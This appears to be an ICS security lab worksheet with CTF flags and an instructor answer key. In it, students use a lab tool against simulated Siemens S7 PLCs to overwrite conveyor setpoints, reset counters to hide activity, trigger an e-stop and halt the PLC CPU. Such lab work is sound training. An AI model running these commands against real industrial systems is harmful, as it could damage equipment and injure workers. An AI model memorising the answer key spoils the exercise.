# Lab 4: S7comm Manufacturing Attack

## Objective
Learn to attack Siemens S7 PLCs to manipulate manufacturing operations, cause quality issues, and trigger safety conditions.

## Prerequisites
- Completed Labs 1-3
- VULNOT Phase 2 platform running
- Basic understanding of manufacturing processes

## Scenario
You have compromised a workstation on the factory floor network. Your target is the production line controlled by Siemens S7-1500 PLCs. Demonstrate how an attacker could sabotage production, damage equipment, or cause safety incidents.

## Time: 75 minutes

---

## ⚠️ SAFETY WARNING

In a real manufacturing environment, these attacks could cause:
- Equipment damage (robots, conveyors, tooling)
- Product quality defects affecting customers
- Worker injuries from unexpected machine behavior
- Production losses costing millions

**Industrial attacks like Stuxnet and TRITON are well-documented.**

---

## Part 1: S7comm Protocol Overview (15 minutes)

### Understanding S7comm

S7comm is Siemens' proprietary protocol used by:
- S7-300, S7-400 (older)
- S7-1200, S7-1500 (newer, but still vulnerable)
- WinCC HMIs
- TIA Portal engineering stations

Key concepts:
- **Data Blocks (DB)**: Structured data storage
- **Inputs/Outputs**: Physical I/O
- **Markers**: Internal flags
- **CPU Operations**: Start, Stop, Read, Write

### Task 1.1: Connect to Attacker Workstation

```bash
docker exec -it vulnot-attacker-factory bash
```

### Task 1.2: Open Factory HMI

Open http://localhost:8080/factory in your browser.

Observe:
- Conveyor zones and speeds
- Robot states
- Production counters
- Safety indicators

**Question 1:** What is the current production count?

---

## Part 2: S7 Reconnaissance (15 minutes)

### Task 2.1: Scan for PLCs

```bash
vulnot-s7 scan -n 10.0.3.0/24 -p 102
```

**Question 2:** How many S7 PLCs did you discover?

### Task 2.2: Nmap Service Detection

```bash
nmap -p 102 -sV --script s7-info 10.0.3.10
```

This may reveal:
- PLC model
- Firmware version
- Module configuration

### Task 2.3: Read Data Blocks

Read the setpoint data block (DB1):

```bash
vulnot-s7 read -t 10.0.3.10 -d 1
```

**Question 3:** What are the current conveyor speeds?

Read the counter data block (DB2):

```bash
vulnot-s7 read -t 10.0.3.10 -d 2
```

Read analog values (DB4):

```bash
vulnot-s7 read -t 10.0.3.10 -d 4
```

**Question 4:** What is the current QC pass rate?

---

## Part 3: Understanding the Production Line (10 minutes)

### Production Flow

```
[Infeed] --> [Robot 1] --> [Assembly/QC] --> [Robot 2] --> [Outfeed] --> [Packaging]
  Conv1       Pick           Conv2            Place         Conv3         Box
```

### Critical Parameters

| Parameter | Normal | Low Alarm | High Alarm |
|-----------|--------|-----------|------------|
| Conveyor Speed | 50-75% | <20% | >90% |
| Robot Temp | 35-50°C | - | >65°C |
| Air Pressure | 6-7 bar | <5.5 bar | >8 bar |
| QC Pass Rate | >98% | <95% | - |

### Task 3.1: Map Attack Surface

Identify which data block addresses control:
- Conveyor speeds (DB1)
- Production targets (DB1)
- Robot cycle times (DB1)

---

## Part 4: Production Sabotage Attacks (20 minutes)

### Attack 1: Conveyor Speed Manipulation

Slow down conveyors to reduce throughput:

```bash
vulnot-s7 write -t 10.0.3.10 -d 1 -o 0 -v 10.0 --type real
```

Watch the HMI - conveyor 1 should slow dramatically.

**Question 5:** What happens to the "parts per hour" rate?

### Attack 2: Conveyor Speed Attack (Jam Condition)

Speed up one conveyor while slowing another to cause jams:

```bash
# Max Zone 1 (infeed)
vulnot-s7 write -t 10.0.3.10 -d 1 -o 0 -v 100.0 --type real

# Slow Zone 2 (assembly)
vulnot-s7 write -t 10.0.3.10 -d 1 -o 4 -v 10.0 --type real
```

**Question 6:** Did a jam alarm trigger?

### Attack 3: Counter Manipulation

Reset production counters to hide your presence:

```bash
vulnot-s7 scenario -t 10.0.3.10 --scenario counter_reset --force
```

**Question 7:** What do the production counters show now?

### Attack 4: Quality Sabotage

If you could modify QC parameters, you could:
- Pass defective parts
- Reject good parts (waste)

This would require deeper access to QC logic.

---

## Part 5: Safety System Attacks (10 minutes)

### Attack 5: E-Stop Trigger

Execute the emergency stop scenario:

```bash
vulnot-s7 scenario -t 10.0.3.10 --scenario estop --force
```

Watch the HMI carefully!

**Question 8:** What happened when E-Stop was triggered?

### Attack 6: CPU Stop (Extreme)

⚠️ This is the most severe attack - it stops the PLC completely:

```bash
vulnot-s7 stop -t 10.0.3.10
```

**Question 9:** What is the impact of a CPU STOP on the production line?

---

## Part 6: Multi-PLC Attack (5 minutes)

### Task 6.1: Attack Second Production Line

Target Line 2 PLC:

```bash
vulnot-s7 read -t 10.0.3.11 -d 1
vulnot-s7 write -t 10.0.3.11 -d 1 -o 0 -v 0 --type real --force
```

### Task 6.2: Coordinated Attack

Imagine attacking both lines simultaneously to halt entire factory production.

---

## Part 7: Recovery

### Reset the Scenario

```bash
curl -X POST http://localhost:8000/api/scenario/factory/reset
```

Or restart the containers:

```bash
docker restart vulnot-factory-line1 vulnot-factory-line2
```

---

## Deliverables

Create an attack report including:

1. **Target Assessment**
   - PLC inventory
   - Data block map
   - Critical parameters

2. **Attack Matrix**
   | Attack | Target | Method | Impact | Detection Likelihood |
   |--------|--------|--------|--------|---------------------|
   | Slowdown | DB1.DBD0 | Write REAL | -80% throughput | Medium |
   | | | | | |

3. **Business Impact Analysis**
   - Production losses per hour
   - Quality impact
   - Safety implications

4. **Recommendations**
   - Network segmentation
   - CPU password protection
   - Access control lists
   - Monitoring solutions

## Assessment Questions

1. Why don't most S7 PLCs have password protection enabled?
2. How did Stuxnet target Siemens PLCs?
3. What is the difference between S7comm and S7comm-plus?
4. How could OPC UA improve security over S7comm?
5. What role does network monitoring play in detecting PLC attacks?

---

## Flags

- **FLAG{s7_scan_complete}** - Successfully discover S7 PLCs
- **FLAG{db_read}** - Read any data block from PLC
- **FLAG{production_halt}** - Stop all conveyors via S7comm
- **FLAG{cpu_stop}** - Successfully stop PLC CPU
- **FLAG{counter_reset}** - Reset production counters

---

## Solution Key (Instructor Only)

<details>
<summary>Click to reveal answers</summary>

**Question 1:** Varies based on runtime, typically 0-500+ parts

**Question 2:** 2 PLCs (Line 1 and Line 2)

**Question 3:** Default: Conv1=75%, Conv2=50%, Conv3=75%

**Question 4:** Should be 98-99% under normal operation

**Question 5:** Throughput drops significantly as parts accumulate

**Question 6:** May trigger jam alarm if mismatch exceeds threshold

**Question 7:** All counters reset to 0

**Question 8:** All conveyors stop, robots go to safe position

**Question 9:** Complete halt - outputs go to safe state, no control

</details>

---

## Real-World Context

### TRITON/TRISIS (2017)
- Targeted Safety Instrumented Systems (SIS)
- Could have caused physical harm to workers
- Highlights risk of attacking safety systems

### Stuxnet (2010)
- Modified S7-300/400 PLCs controlling centrifuges
- Altered frequency converter speeds
- First known cyber weapon targeting ICS

### Lessons Learned
- Air gaps are not enough
- Engineering workstations are high-value targets
- Protocol-level authentication is essential
- Defense in depth is critical

---

## Next Lab

In Lab 5, you will learn defensive techniques including network monitoring, anomaly detection, and incident response for OT environments.
